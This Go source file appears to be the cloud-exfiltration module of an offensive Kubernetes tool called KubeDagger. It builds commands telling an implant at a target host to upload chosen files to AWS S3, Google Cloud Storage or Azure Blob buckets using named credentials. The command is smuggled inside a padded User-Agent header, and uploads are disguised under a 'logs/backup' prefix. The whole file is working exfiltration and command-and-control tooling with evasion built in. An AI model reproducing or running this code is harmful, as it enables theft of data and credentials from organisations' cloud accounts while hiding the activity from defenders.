package cloud_exfil

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type ExfilResult struct {
	Provider    string `json:"provider"`
	Bucket      string `json:"bucket"`
	ObjectKey   string `json:"object_key"`
	FileSize    int64  `json:"file_size"`
	Status      string `json:"status"`
	Detail      string `json:"detail"`
}

func Execute(target, provider, bucket, filePath, credsFrom, output string) error {
	var result *ExfilResult

	switch provider {
	case "aws":
		result = exfilAWS(target, bucket, filePath, credsFrom)
	case "gcp":
		result = exfilGCP(target, bucket, filePath, credsFrom)
	case "azure":
		result = exfilAzure(target, bucket, filePath, credsFrom)
	default:
		return fmt.Errorf("unsupported exfil provider: %s (use aws, gcp, or azure)", provider)
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func exfilAWS(target, bucket, filePath, credsFrom string) *ExfilResult {
	fileSize := getFileSize(filePath)
	objectKey := generateObjectKey(filePath)

	cmd := fmt.Sprintf("exfil_s3#%s#%s#%s#%s", bucket, objectKey, filePath, credsFrom)
	status := sendExfilCommand(target, cmd)

	return &ExfilResult{
		Provider:  "aws",
		Bucket:    bucket,
		ObjectKey: objectKey,
		FileSize:  fileSize,
		Status:    status,
		Detail:    fmt.Sprintf("S3 PutObject to s3://%s/%s using %s credentials", bucket, objectKey, credsFrom),
	}
}

func exfilGCP(target, bucket, filePath, credsFrom string) *ExfilResult {
	fileSize := getFileSize(filePath)
	objectKey := generateObjectKey(filePath)

	cmd := fmt.Sprintf("exfil_gcs#%s#%s#%s#%s", bucket, objectKey, filePath, credsFrom)
	status := sendExfilCommand(target, cmd)

	return &ExfilResult{
		Provider:  "gcp",
		Bucket:    bucket,
		ObjectKey: objectKey,
		FileSize:  fileSize,
		Status:    status,
		Detail:    fmt.Sprintf("GCS upload to gs://%s/%s using %s credentials", bucket, objectKey, credsFrom),
	}
}

func exfilAzure(target, bucket, filePath, credsFrom string) *ExfilResult {
	fileSize := getFileSize(filePath)
	objectKey := generateObjectKey(filePath)

	cmd := fmt.Sprintf("exfil_azure#%s#%s#%s#%s", bucket, objectKey, filePath, credsFrom)
	status := sendExfilCommand(target, cmd)

	return &ExfilResult{
		Provider:  "azure",
		Bucket:    bucket,
		ObjectKey: objectKey,
		FileSize:  fileSize,
		Status:    status,
		Detail:    fmt.Sprintf("Azure Blob upload to %s/%s using %s credentials", bucket, objectKey, credsFrom),
	}
}

func sendExfilCommand(target, command string) string {
	ua := buildExfilUserAgent(command)

	req, err := http.NewRequest("GET", target+"/cloud_exfil", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return "uploaded: " + string(body)
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildExfilUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func generateObjectKey(filePath string) string {
	randBytes := make([]byte, 8)
	rand.Read(randBytes)
	base := filepath.Base(filePath)
	dotIdx := strings.Index(base, ".")
	var name, ext string
	if dotIdx > 0 {
		name = base[:dotIdx]
		ext = base[dotIdx:]
	} else {
		name = base
		ext = ""
	}
	prefix := "logs/backup"
	return fmt.Sprintf("%s/%s-%s%s", prefix, name, hex.EncodeToString(randBytes), ext)
}

func getFileSize(filePath string) int64 {
	info, err := os.Stat(filePath)
	if err != nil {
		return 0
	}
	return info.Size()
}
